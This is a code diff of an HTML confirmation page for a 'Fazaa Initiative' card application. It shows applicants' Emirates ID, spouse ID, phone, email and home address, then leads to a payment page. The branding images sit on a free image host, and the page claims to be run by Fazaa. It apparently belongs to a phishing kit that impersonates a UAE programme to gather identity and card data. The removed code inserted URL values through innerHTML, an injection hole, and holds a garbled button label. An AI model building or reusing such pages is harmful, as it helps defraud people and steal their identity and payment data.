@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Application Confirmation - Fazaa 2026</title>
+    <title>Confirm Data - Fazaa Initiative</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background-color: #f5f7fa; color: #1e3a5f; line-height: 1.6; }
@@ -13,125 +13,225 @@
         
         .logo-container img { max-height: 50px; width: auto; display: block; }
         
-        .container { max-width: 600px; margin: 40px auto; padding: 0 15px; text-align: center; }
-        
-        .main-title { color: #1e3a5f; font-size: 1.8rem; font-weight: bold; margin-bottom: 10px; }
-        .sub-title { color: #6c7a89; font-size: 1rem; margin-bottom: 30px; }
+        .lang-switch { background: linear-gradient(135deg, #d4af37, #aa7c11); color: #fff; border: none; padding: 8px 18px; font-weight: bold; border-radius: 8px; cursor: pointer; font-size: 0.9rem; transition: 0.3s; }
+        .lang-switch:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(170, 124, 17, 0.2); }
 
-        .steps-container { display: flex; justify-content: center; align-items: center; gap: 10px; margin-bottom: 35px; font-size: 0.9rem; color: #a0aec0; }
+        .hero-banner { width: 100%; max-width: 600px; margin: 20px auto 0 auto; padding: 0 15px; }
+        .hero-banner img { width: 100%; border-radius: 16px; display: block; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
+
+        .container { max-width: 600px; margin: 20px auto; padding: 0 15px; text-align: center; }
+        
+        .main-title { color: #1e3a5f; font-size: 1.6rem; font-weight: bold; margin-bottom: 5px; }
+        .sub-title { color: #6c7a89; font-size: 0.95rem; margin-bottom: 25px; padding: 0 10px; }
+
+        .steps-container { display: flex; justify-content: center; align-items: center; gap: 10px; margin-bottom: 25px; font-size: 0.9rem; color: #a0aec0; }
         .step { display: flex; align-items: center; gap: 6px; }
         .step.active { color: #1e3a5f; font-weight: bold; }
         .step-num { width: 24px; height: 24px; border-radius: 50%; background-color: #e2e8f0; color: #718096; display: flex; align-items: center; justify-content: center; font-size: 0.8rem; font-weight: bold; }
         .step.active .step-num { background-color: #1e3a5f; color: #fff; }
         .step-line { width: 40px; height: 2px; background-color: #e2e8f0; }
-        .step.done { color: #d4af37; }
-        .step.done .step-num { background-color: #d4af37; color: #fff; }
 
-        .summary-card { background: #ffffff; border-radius: 16px; padding: 25px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border: 1px solid #edf2f7; margin-bottom: 30px; text-align: left; }
-        .summary-item { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #f7fafc; }
-        .summary-item:last-child { border-bottom: none; }
-        .summary-label { font-weight: bold; color: #718096; }
-        .summary-value { color: #1e3a5f; font-weight: 600; }
+        .confirmation-section { background: #ffffff; border-radius: 16px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.02); border: 1px solid #edf2f7; margin-bottom: 20px; text-align: left; }
+        
+        .section-title { color: #1e3a5f; font-size: 1.25rem; font-weight: bold; margin-bottom: 20px; border-bottom: 3px solid #d4af37; padding-bottom: 10px; display: inline-block; width: 100%; }
 
-        .payment-info { background-color: #ebf8ff; border: 1px solid #bee3f8; color: #2b6cb0; padding: 15px; border-radius: 12px; margin-bottom: 20px; font-size: 0.9rem; text-align: left; font-weight: 500; }
+        .card-display { text-align: center; margin-bottom: 20px; }
+        .card-display img { max-width: 200px; height: auto; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        .card-type-name { font-weight: bold; font-size: 1.1rem; color: #2d3748; margin-top: 10px; }
 
-        .btn-payment { background: #1e3a5f; color: #ffffff; font-weight: bold; padding: 18px; border-radius: 50px; border: none; width: 100%; font-size: 1.2rem; cursor: pointer; transition: 0.3s; margin-top: 10px; box-shadow: 0 4px 12px rgba(30, 58, 95, 0.2); }
-        .btn-payment:hover { background: #142842; transform: translateY(-2px); box-shadow: 0 6px 20px rgba(30, 58, 95, 0.3); }
+        .data-table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
+        .data-table tr { border-bottom: 1px solid #edf2f7; }
+        .data-table td { padding: 12px; text-align: left; }
+        .data-table .label { font-weight: bold; color: #1e3a5f; width: 40%; background-color: #f7fafc; }
+        .data-table .value { color: #4a5568; }
 
-        footer { background-color: #1e3a5f; color: #ffffff; padding: 40px 20px; margin-top: 60px; border-top: 4px solid #d4af37; text-align: center; }
+        .action-buttons { display: flex; gap: 15px; margin-top: 30px; flex-direction: column; }
+        .btn { padding: 14px 20px; border-radius: 50px; border: none; font-weight: bold; font-size: 1rem; cursor: pointer; transition: 0.3s; width: 100%; }
+        
+        .btn-continue { background: #1e3a5f; color: #ffffff; }
+        .btn-continue:hover { background: #142842; transform: translateY(-2px); box-shadow: 0 6px 20px rgba(30, 58, 95, 0.25); }
+        
+        .btn-edit { background: #ffffff; color: #1e3a5f; border: 2px solid #d4af37; }
+        .btn-edit:hover { background: #fefaf0; transform: translateY(-2px); box-shadow: 0 4px 12px rgba(212, 175, 55, 0.15); }
+
+        footer { background-color: #1e3a5f; color: #ffffff; padding: 40px 20px; margin-top: 40px; border-top: 4px solid #d4af37; text-align: center; }
+        .footer-links { margin-bottom: 15px; }
+        .footer-links a { color: #ffffff; text-decoration: none; margin: 0 15px; font-size: 0.95rem; opacity: 0.9; transition: 0.3s; font-weight: 500; }
+        .footer-links a:hover { color: #d4af37; opacity: 1; }
+        .footer-managed { font-size: 0.9rem; color: #e2e8f0; margin-bottom: 10px; opacity: 0.8; }
         .copyright { color: #cbd5e1; font-size: 0.85rem; opacity: 0.7; }
+
+        @media (max-width: 600px) {
+            .action-buttons { flex-direction: column; }
+            .btn { width: 100%; }
+        }
     </style>
 </head>
 <body>
 
     <header>
         <div class="header-container">
-            <div style="width: 80px;"></div>
             <div class="logo-container">
                 <img src="https://i.ibb.co/MDLJXRC1/unnamed-2.png" alt="Fazaa Logo">
             </div>
-            <div style="width: 80px;"></div>
+            <button class="lang-switch" onclick="window.location.href='confirmation_ar.html'">العربية</button>
         </div>
     </header>
 
+    <div class="hero-banner">
+        <img src="https://i.ibb.co/yckbnyWH/7bb8299f-e545-4012-a1b2-6c48cd8c91a2.jpg" alt="Fazaa Initiative">
+    </div>
+
     <div class="container">
-        <h1 class="main-title">Confirm Your Details</h1>
-        <p class="sub-title">Please review your information before proceeding to payment.</p>
+        <h1 class="main-title">Review Your Information</h1>
+        <p class="sub-title">Please verify that all information is correct before proceeding to payment</p>
 
         <div class="steps-container">
-            <div class="step done"><span class="step-num">1</span> Data</div>
-            <div class="step-line" style="background-color: #d4af37;"></div>
+            <div class="step"><span class="step-num">1</span> Information</div>
+            <div class="step-line"></div>
             <div class="step active"><span class="step-num">2</span> Confirmation</div>
             <div class="step-line"></div>
             <div class="step"><span class="step-num">3</span> Payment</div>
         </div>
 
-        <div class="summary-card" id="summaryCard">
-            <!-- Data will be injected here by JS -->
+        <!-- Card Type -->
+        <div class="confirmation-section">
+            <h2 class="section-title">Selected Card Type</h2>
+            <div class="card-display">
+                <img id="cardImage" src="https://i.ibb.co/60xc9jxT/Platinum.png" alt="Card">
+                <p class="card-type-name" id="cardTypeName">Platinum</p>
+            </div>
         </div>
 
-        <div class="payment-info">
-            No fees will be charged until your application has been reviewed and approved. In case your application is not approved, no fees will be deducted.
+        <!-- Personal Information -->
+        <div class="confirmation-section">
+            <h2 class="section-title">Personal Information</h2>
+            <table class="data-table">
+                <tr>
+                    <td class="label">Full Name</td>
+                    <td class="value" id="fullName">-</td>
+                </tr>
+                <tr>
+                    <td class="label">Emirates ID</td>
+                    <td class="value" id="emiratesId">-</td>
+                </tr>
+                <tr>
+                    <td class="label">Spouse/Partner Name</td>
+                    <td class="value" id="spouseName">-</td>
+                </tr>
+                <tr>
+                    <td class="label">Spouse/Partner ID</td>
+                    <td class="value" id="spouseId">-</td>
+                </tr>
+                <tr>
+                    <td class="label">Phone Number</td>
+                    <td class="value" id="phone">-</td>
+                </tr>
+                <tr>
+                    <td class="label">Email Address</td>
+                    <td class="value" id="email">-</td>
+                </tr>
+                <tr>
+                    <td class="label">Residency Status</td>
+                    <td class="value" id="residenceStatus">-</td>
+                </tr>
+            </table>
         </div>
 
-        <button class="btn-payment" id="paymentBtn" onclick="window.location.href='payment.html'">}],path: to Payment</button>
+        <!-- Delivery Information -->
+        <div class="confirmation-section">
+            <h2 class="section-title">Delivery Information</h2>
+            <table class="data-table">
+                <tr>
+                    <td class="label">Emirate</td>
+                    <td class="value" id="emirate">-</td>
+                </tr>
+                <tr>
+                    <td class="label">Area</td>
+                    <td class="value" id="area">-</td>
+                </tr>
+                <tr>
+                    <td class="label">Street</td>
+                    <td class="value" id="street">-</td>
+                </tr>
+                <tr>
+                    <td class="label">Building</td>
+                    <td class="value" id="building">-</td>
+                </tr>
+                <tr>
+                    <td class="label">Floor & Apartment</td>
+                    <td class="value" id="apartment">-</td>
+                </tr>
+            </table>
+        </div>
+
+        <!-- Action Buttons -->
+        <div class="action-buttons">
+            <button class="btn btn-continue" onclick="goToPayment()">Proceed to Payment</button>
+            <button class="btn btn-edit" onclick="goBack()">Edit Information</button>
+        </div>
     </div>
 
     <footer>
-        <div class="copyright">&copy; 2026 All rights reserved to Fazaa UAE.</div>
+        <div class="footer-links">
+            <a href="#">Privacy Policy</a>
+            <a href="#">Terms & Conditions</a>
+        </div>
+        <div class="footer-managed">This website is operated and managed by Fazaa Initiative to support UAE families.</div>
+        <div class="copyright">© 2026 All rights reserved by Fazaa UAE.</div>
     </footer>
 
     <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const labels = {
-            card_type: "Card Type",
-            full_name: "Full Name",
-            emirates_id: "Emirates ID",
-            spouse_name: "Spouse Name",
-            spouse_id: "Spouse ID",
-            phone: "Phone Number",
-            email: "Email",
-            residency_status: "Residency Status",
-            emirate: "Emirate",
-            area: "Area",
-            street: "Street",
-            building: "Building",
-            floor_apartment: "Floor/Apt"
-        };
-
-        const summaryCard = document.getElementById('summaryCard');
-
-        urlParams.forEach((value, key) => {
-            if (value && key !== 'declaration' && labels[key]) {
-                const item = document.createElement('div');
-                item.className = 'summary-item';
-                
-                const labelSpan = document.createElement('span');
-                labelSpan.className = 'summary-label';
-                labelSpan.textContent = labels[key];
-                
-                const valueSpan = document.createElement('span');
-                valueSpan.className = 'summary-value';
-                valueSpan.textContent = value;
-                
-                item.appendChild(labelSpan);
-                item.appendChild(valueSpan);
-                summaryCard.appendChild(item);
-            }
-        });
-
-        // Add child data if exists
-        for (let i = 1; i <= 4; i++) {
-            const name = urlParams.get(`child_name_${i}`);
-            const id = urlParams.get(`child_id_${i}`);
-            if (name) {
-                const item = document.createElement('div');
-                item.className = 'summary-item';
-                item.style.borderTop = "1px dashed #e2e8f0";
-                item.innerHTML = `<span class="summary-label">Child ${i}</span><span class="summary-value">${name} (${id})</span>`;
-                summaryCard.appendChild(item);
-            }
+        // Load data from localStorage
+        function loadData() {
+            const formData = JSON.parse(localStorage.getItem('formData') || '{}');
+            
+            // Update personal information
+            document.getElementById('fullName').textContent = formData.full_name || '-';
+            document.getElementById('emiratesId').textContent = formData.emirates_id || '-';
+            document.getElementById('spouseName').textContent = formData.spouse_name || '-';
+            document.getElementById('spouseId').textContent = formData.spouse_id || '-';
+            document.getElementById('phone').textContent = formData.phone || '-';
+            document.getElementById('email').textContent = formData.email || '-';
+            document.getElementById('residenceStatus').textContent = formData.residence_status || '-';
+            
+            // Update delivery information
+            document.getElementById('emirate').textContent = formData.emirate || '-';
+            document.getElementById('area').textContent = formData.area || '-';
+            document.getElementById('street').textContent = formData.street || '-';
+            document.getElementById('building').textContent = formData.building || '-';
+            document.getElementById('apartment').textContent = formData.apartment || '-';
+            
+            // Update card type
+            const cardType = formData.card_type || 'platinum';
+            const cardImages = {
+                'platinum': 'https://i.ibb.co/60xc9jxT/Platinum.png',
+                'gold': 'https://i.ibb.co/zTtvJy3p/Gold.png',
+                'silver': 'https://i.ibb.co/HpHKNFKZ/Silver.png'
+            };
+            const cardNames = {
+                'platinum': 'Platinum',
+                'gold': 'Gold',
+                'silver': 'Silver'
+            };
+            
+            document.getElementById('cardImage').src = cardImages[cardType];
+            document.getElementById('cardTypeName').textContent = cardNames[cardType];
         }
+        
+        function goToPayment() {
+            // Save data before going to payment page
+            window.location.href = 'payment.html';
+        }
+        
+        function goBack() {
+            // Go back to index page to edit
+            window.location.href = 'index.html';
+        }
+        
+        // Load data when page loads
+        window.addEventListener('load', loadData);
     </script>
+
 </body>
 </html>
